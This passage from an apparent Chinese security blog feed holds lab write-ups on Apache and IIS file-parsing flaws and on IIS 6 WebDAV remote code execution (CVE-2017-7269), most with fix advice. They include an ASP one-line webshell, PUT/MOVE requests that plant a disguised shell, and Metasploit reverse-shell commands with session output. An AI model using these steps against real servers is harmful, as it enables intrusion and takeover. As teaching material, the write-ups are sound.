        <content type="html"><![CDATA[<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>在<code>Apache</code>中，访问：<code>liuwx.php.360</code>会从右往左识别后缀，存在解析漏洞的时候，会从右往左识别哪个能解析，360是不能被解析，然后往左识别到<code>php</code>就识别能解析，这就是<code>Apache</code>的解析漏洞</p><h2 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2003_x64</span><br><span class="line"></span><br><span class="line">Apache</span><br><span class="line"></span><br><span class="line">PhpStudy</span><br></pre></td></tr></table></figure><blockquote><p>2003服务器必须能和PC物理主机相互Ping通</p></blockquote><p>在这里我物理主机的IP是：<code>192.168.1.101</code></p><p>2008虚拟机的IP是：<code>192.168.119.134</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/246.png" alt="图片"></p><p>提示：如果物理主机<code>Ping</code>不通<code>2003</code>，那么就吧<code>2003</code>的防火墙关闭就可以了！</p><p>网络环境安装完后，直接安装<code>Phpstudy</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/247.png" alt="图片"></p><p>安装完<code>Phpstudy</code>用到的版本是：</p><p><code>Apache</code> + <code>PHP 5.2</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/248.png" alt="图片"></p><p>用<code>Apache</code>搭建的网站，默认的玩这个更目录是:<code>C:\phpstudy\WWW</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/249.png" alt="图片"></p><p>访问：<code>http://192.168.119.134/1.txt</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/250.png" alt="图片"></p><p>OK!这个时候我们的网站已经环境都已经安装完毕了!</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/251.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">服务器域名/IP地址：192.168.119.134(192.168.119.134)</span><br><span class="line"></span><br><span class="line">服务器解译引擎：Apache/2.4.10 (Win32) OpenSSL/0.9.8zb PHP/5.2.17</span><br><span class="line"></span><br><span class="line">服务器端口：80</span><br><span class="line"></span><br><span class="line">服务器主机名：HACKER</span><br><span class="line"></span><br><span class="line">绝对路径：C:/phpstudy/WWW</span><br><span class="line"></span><br><span class="line">探针路径：C:/phpstudy/WWW/l.php</span><br></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><code>Apache</code>文件解析漏洞与用户的配置有密切的关系，严格来说属于用户配置问题。<code>Apache</code>文件解析漏洞涉及到一个解析文件的特性。<code>Apache</code>默认一个文件可以有多个以点<code>.</code>分割的后缀，当右边的后缀无法识别，则继续向左识别，发现后缀是<code>php</code>,交个<code>php</code>处理这个文件。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先创建了一个<code>liwux.shell</code>的文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/252.png" alt="图片"></p><p>很显然<code>.shell</code>的文件后缀是未知的后缀名，但是浏览器还是把它当做<code>php</code>执行解析了！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/253.png" alt="图片"></p><p>我们把后缀换成熟悉的格式：<code>liwux.php.aaa</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/254.png" alt="图片"></p><p>可以看到，任然能够正常的解析<code>php</code></p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、修改Apache的主配置文件：<code>C:\phpstudy\Apache\conf\httpd.conf</code></p><p>对apache的配置文件做适当修改，在文件中添加下面几行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.(php.|php3.|php4.|php5.)&quot;&gt;</span><br><span class="line"></span><br><span class="line">  Order Deny,Allow</span><br><span class="line"></span><br><span class="line">  Deny from all</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>2、禁止*.php.*文件的访问权限</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache </tag>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS-解析漏洞(下)</title>
      <link href="/2019/08/20/IIS-5/"/>
      <url>/2019/08/20/IIS-5/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=475072648&auto=1&height=66"></iframe><h2 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008_x64</span><br><span class="line"></span><br><span class="line">IIS 7.*</span><br><span class="line"></span><br><span class="line">PhpStudy</span><br></pre></td></tr></table></figure><blockquote><p>2008服务器必须能和PC物理主机相互Ping通</p></blockquote><p>在这里我物理主机的IP是：<code>192.168.1.100</code></p><p>2008虚拟机的IP是：<code>192.168.119.137</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/217.png" alt="图片"></p><p>提示：如果物理主机<code>Ping</code>不通<code>2008</code>，那么就吧<code>2008</code>的防火墙关闭就可以了！</p><h2 id="安装IIS7-0"><a href="#安装IIS7-0" class="headerlink" title="安装IIS7.0"></a>安装IIS7.0</h2><p>服务器管理器 - 角色 - 下一步 Web服务器IIS - 勾选CGI</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/218.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/219.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/220.png" alt="图片"></p><p>因为我们漏洞复现所需的条件就是<code>CGI</code>是开启的！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/221.png" alt="图片"></p><p>安装成功以后，在<code>开始菜单</code> - <code>管理工具</code> - <code>Internet 信息服务（IIS）管理器</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/222.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/223.png" alt="图片"></p><p>访问<code>http://192.168.119.137/</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/224.png" alt="图片"></p><p>这个就是<code>IIS7.0</code>的页面！</p><p>不知道你们注意没有，在<code>2008</code>服务器中，右键新建，只能新建文件夹，不能新建文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/225.png" alt="图片"></p><p>其实就是<code>权限</code>的问题！</p><p>解决方法：来到目录 - 右键属性 -安全 -添加一个<code>Evervone</code>权限</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/226.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/227.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/228.png" alt="图片"></p><p>这个时候就可以新建文件了！</p><h2 id="安装PhpStudy"><a href="#安装PhpStudy" class="headerlink" title="安装PhpStudy"></a>安装PhpStudy</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/229.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/230.png" alt="图片"></p><p>安装完<code>PhyStudy</code>后，他显示<code>Apache</code>已经停止，其实就是端口的问题 - <code>端口冲突</code>导致的！</p><p>因为我们在<code>IIS7.0</code>已经安装了一个网站了，端口是<code>80</code>，所以导致<code>Apache</code>异常！</p><p>切换版本 - IIS7/8 + PHP5.2</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/231.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/232.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/233.png" alt="图片"></p><p>这个时候IIS就会有一个Phpstudy的网站，我们不用它，把它停止，用默认网站就行了！</p><p>这个时候服务器的<code>PHP</code>环境就搭建好了，就可以运行<code>PHP</code>脚本了！</p><p>在网站根目录创建一个<code>1.php</code>的文件看看能不能访问：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/234.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/235.png" alt="图片"></p><p>环境都搭建完毕了！</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">liuwx.jpg/.php</span><br></pre></td></tr></table></figure><h2 id="漏洞形成条件"><a href="#漏洞形成条件" class="headerlink" title="漏洞形成条件"></a>漏洞形成条件</h2><p>1、<code>php.ini</code>里<code>cgi.fix_pathinfo=1</code></p><p>2、IIS7在<code>Fast-CGI</code>运行模式下</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先新建一个<code>liuwx.jpg</code>的文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/236.png" alt="图片"></p><p>访问一下看看：</p><blockquote><p><a href="http://192.168.119.137/liuwx.jpg">http://192.168.119.137/liuwx.jpg</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/237.png" alt="图片"></p><p>图片是正常访问的！</p><p>我们访问：</p><blockquote><p><a href="http://192.168.119.137/liuwx.jpg/.php">http://192.168.119.137/liuwx.jpg/.php</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/238.png" alt="图片"></p><p>提示：服务器错误，404-找不到文件或目录</p><p>很显然漏洞复现失败！是因为漏洞形成条件没有达到！</p><p>来到这里：<code>C:\phpstudy\php52</code>有一个<code>php.ini</code>配置文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/239.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/240.png" alt="图片"></p><p>默认<code>cgi.fix_pathinfo</code>是<code>0</code>，我们把前面的<code>;</code>去掉，因为那是注释，然后把<code>0</code>改为<code>1</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/241.png" alt="图片"></p><p>这个时候就满足漏洞的第一个条件了，接下来我们去配置第二个条件：</p><p>来到<code>Internet 信息服务(IIS)管理器</code> - <code>处理程序映射</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/242.png" alt="图片"></p><p><code>phpstudy_FastCGI</code> - <code>请求限制</code> - 吧哪个<code>映射√取消掉</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/243.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/244.png" alt="图片"></p><p>这个时候，漏洞形成的条件都满足了！</p><p>再来访问：</p><blockquote><p><a href="http://192.168.119.137/liuwx.jpg/.php">http://192.168.119.137/liuwx.jpg/.php</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/245.png" alt="图片"></p><p>漏洞成功复现，当我们把一个<code>jpg</code>图片后面加上<code>/.php</code>，它就会吧图片当做<code>php</code>脚本来执行！</p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、配置<code>php.ini</code>里<code>cgi.fix_pathinfo=1</code>,并重启服务器</p><p>2、在模块映射中勾选请求设置</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS-解析漏洞(上)</title>
      <link href="/2019/08/16/IIS-4/"/>
      <url>/2019/08/16/IIS-4/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1343379745&auto=1&height=66"></iframe><h2 id="漏洞介绍与成因"><a href="#漏洞介绍与成因" class="headerlink" title="漏洞介绍与成因"></a>漏洞介绍与成因</h2><p>在<code>IIS-6.0</code>这个版本中，搭建的服务器是<code>2003</code>系统中所造成的解析漏洞的两种情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">情况一：/liuwx.asp/liuwx.jpg</span><br><span class="line"></span><br><span class="line">介绍：在网站的根目录下创建一个命名为liuwx.asp的文件夹，该文件夹下有一个liuwx.jpg的图片木马，也就是说该目录下的所有文件都会被当做asp脚本文件</span><br><span class="line"></span><br><span class="line">利用：访问 www.liuwx.cn/liuwx.asp/liuwx.jpg 会吧图片解析当成asp脚本文件执行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">情况二：`liuwx.asp;.jpg`</span><br><span class="line"></span><br><span class="line">介绍：创建一个图片并命名为liuwx.asp;.jpg，注意有一个分号和点，的图片文件</span><br><span class="line"></span><br><span class="line">利用：www.liuwx.cn/liuwx.asp/liuwx.asp;.jpg  会吧它当做脚本文件执行</span><br></pre></td></tr></table></figure><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虚拟机：Windows Server 2003 Enterprise x64 Edition</span><br></pre></td></tr></table></figure><blockquote><p>物理主机和2003虚拟机必须能相互Ping通</p></blockquote><p>在这里我物理主机的IP是：<code>192.168.1.100</code></p><p>2003虚拟机的IP是：<code>192.168.119.133</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/202.png" alt="图片"></p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h4 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h4><p>我首先在网站<code>根目录下</code>创建了一个<code>liuwx.asp</code>的目录，该目录下有一个liuwx.txt文件，里面写了<code>这是情况一</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/203.png" alt="图片"></p><p>接下来吧<code>.txt</code>修改为<code>.jpg</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/204.png" alt="图片"></p><p>此时，用<code>物理机</code>访问<code>2003虚拟机</code>的图片地址：</p><blockquote><p><a href="http://192.168.119.133/liuwx.asp/liuwx.jpg">http://192.168.119.133/liuwx.asp/liuwx.jpg</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/205.png" alt="图片"></p><p>可以看到它并没有显示图片，而是吧图片当做脚本来执行了！为了方便演示，我吧图片内容修改为<code>asp一句话</code>来演示<code>&lt;%execute(request(&quot;cmd&quot;))%&gt;</code>：</p><p>然后用菜刀链接URL:</p><blockquote><p><a href="http://192.168.119.133/liuwx.asp/liuwx.jpg">http://192.168.119.133/liuwx.asp/liuwx.jpg</a> | cmd</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/206.png" alt="图片"></p><p>这个时候我们就成功得到了一个<code>webshell</code></p><h4 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h4><p>在网站<code>根目录</code>下创建一个命名为<code>liuwx.asp;.jpg</code>的文件，其中和上面的一样，里面写了<code>asp一句话</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/207.png" alt="图片"></p><p>用菜刀链接URL:</p><blockquote><p><a href="http://192.168.119.133/liuwx.asp;.jpg">http://192.168.119.133/liuwx.asp;.jpg</a> | cmd</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/208.png" alt="图片"></p><p>这个时候我们就又成功得到了一个<code>webshell</code></p><h2 id="通过PUT漏洞来利用IIS6-0解析漏洞"><a href="#通过PUT漏洞来利用IIS6-0解析漏洞" class="headerlink" title="通过PUT漏洞来利用IIS6.0解析漏洞"></a>通过PUT漏洞来利用IIS6.0解析漏洞</h2><p>关于<code>PUT</code>漏洞可以看我之前写的文章：<a href="http://www.liuwx.cn/IIS-1.html">传送门</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/209.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 201 Created</span><br><span class="line">Date: Fri, 16 Aug 2019 15:33:02 GMT</span><br><span class="line">Server: Microsoft-IIS/6.0</span><br><span class="line">MicrosoftOfficeWebServer: 5.0_Pub</span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">Location: http://192.168.119.133/test.txt</span><br><span class="line">Content-Length: 0</span><br><span class="line">Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK</span><br></pre></td></tr></table></figure><p>服务器验证一下看看存在不存在：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/210.png" alt="图片"></p><p>上传成功！</p><p>当然，我们上传<code>txt</code>文件并没有什么作用，我们得上传脚本文件才可以发挥作用。</p><p>我们上传先用<code>PUT</code>上传一个<code>shell.txt</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/211.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/212.png" alt="图片"></p><p>上传成功后我们再选择<code>MOVE</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/213.png" alt="图片"></p><p>切记数据包中一定要加:<code>;.jpg</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOVE /shell.txt HTTP/1.1</span><br><span class="line">Host: 192.168.119.133</span><br><span class="line">Destination: http://192.168.119.133/shell.asp;.jpg</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/214.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/215.png" alt="图片"></p><p>这个时候就成功上传了一个<code>shell.asp;/jpg</code>的文件！</p><p>我们使用<code>中国菜刀</code>连接一下Shell：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/216.png" alt="图片"></p><p>这个时候就拿到了网站的控制权限！</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>程序方面：</p><p>1、对新建目录文件名进行过滤，不允许新建包含<code>.</code>的文件夹</p><p>2、取消网站后台新建目录的功能，不允许新建目录</p><p>3、限制上传的脚本执行权限，不允许执行脚本</p><p>4、过滤<code>.asp/*.jpg</code>,通过<code>ISApi</code>组件过滤</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS-远程代码执行漏洞</title>
      <link href="/2019/08/03/IIS-3/"/>
      <url>/2019/08/03/IIS-3/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29794354&auto=1&height=66"></iframe><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>开启<code>WebDAV</code>服务的<code>IIS 6.0</code>被爆存在<code>缓存区溢出漏洞</code>导致远程代码执行，目前针对<code>Windows Server 2003 R2</code>可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。<br>影响产品：<code>Microsoft Windows Server 2003 R2</code> 开启<code>WebDAV</code>服务的IIS6.0（目前已验证，其他版本尚未验证）</p><p>触发函数：<code>ScStoragePathFromUrl</code>函数</p><p>附加信息：<code>ScStoragePathFromUrl</code>函数被调用了两次</p><p>漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote><p>必须确保Kali Linux 和 Windows 2003 能够相互Ping通，IIS6.0,必须开启了WebDAV</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2003 R2 32位 作为服务器 （IIS6.0，开启了WebDAV）</span><br><span class="line">Kali Linux 作为攻击主机</span><br></pre></td></tr></table></figure><p>在这里，我用到的网络连接方式是<code>NET</code>模式：用于共享主机的IP地址</p><p>Kali Linux 的 IP是：<code>192.168.119.136</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/180.png" alt="图片"></p><p>Windows 2003 的 IP是：<code>192.168.119.134</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/181.png" alt="图片"></p><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>下载<code>cve-2017-7269</code>漏洞利用脚本</p><p>IIS代码执行脚本 - cve-2017-7269：<a href="https://github.com/zcgonvh/cve-2017-7269">下载链接</a></p><p>下载好了，吧<code>exp</code>复制到kali的这个目录下：</p><blockquote><p>/usr/share/metasploit-framework/modules/exploits/windows/iis</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/182.png" alt="图片"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动Metasploit</span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">使用cve-2017-7269这个攻击载荷</span><br><span class="line">use exploit/windows/iis/cve-2017-7269</span><br><span class="line"></span><br><span class="line">查看有哪些参数需要设置</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/183.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">设置被攻击者（windows_2003）的IP</span><br><span class="line">set RHOST 192.168.119.134</span><br><span class="line"></span><br><span class="line">设置服务器的地址（Windows_2003）</span><br><span class="line">set HttpHost 192.168.119.134</span><br><span class="line"></span><br><span class="line">设置Kali的IP地址</span><br><span class="line">set LHOST 192.168.119.136</span><br><span class="line"></span><br><span class="line">设置Payload返回载荷</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设置完之后就可以看到我们设置的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/iis/cve-2017-7269) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/iis/cve-2017-7269):</span><br><span class="line"></span><br><span class="line">   Name                Current Setting  Required  Description</span><br><span class="line">   ----                ---------------  --------  -----------</span><br><span class="line">   HttpHost            192.168.119.134  yes       http host for target</span><br><span class="line">   PhysicalPathLength  19               yes       length of physical path for target(include backslash)</span><br><span class="line">   RHOST               192.168.119.134  yes       The target address</span><br><span class="line">   RPORT               80               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.119.136  yes       The listen address</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Microsoft Windows Server 2003 R2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/184.png" alt="图片"></p><p>设置完之后，我们就可以使用命令：<code>exploit</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/185.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/iis/cve-2017-7269) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.119.136:4444 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.119.134</span><br><span class="line">[*] Sleeping before handling stage...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.119.136:4444 -&gt; 192.168.119.134:1031) at 2019-08-03 14:14:40 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>这个时候就可以执行<code>shell</code>命令了~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">[-] Failed to spawn shell with thread impersonation. Retrying without it.</span><br><span class="line">Process 2044 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [�汾 5.2.3790]</span><br><span class="line">(C) ��Ȩ���� 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure><p>查看当前的权限：<code>whoami</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\network service</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure><p><code>network service</code>是一个一般用户的权限</p><h2 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h2><p>使用<code>Metasploit</code>对<code>Windows-2003</code>进行提权:</p><blockquote><p>用到pr.exe提权exp</p></blockquote><p>首先使用<code>shell</code>命令看看能不能创建文件夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 